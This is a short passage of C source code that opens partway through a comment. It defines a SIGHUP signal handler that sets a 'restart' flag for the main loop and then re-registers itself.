 * a flag variable which will tell the main loop to go through a restart.
 */
void sighup_handler()

{
	restart = 1;
	signal(SIGHUP, sighup_handler);
	return;
}
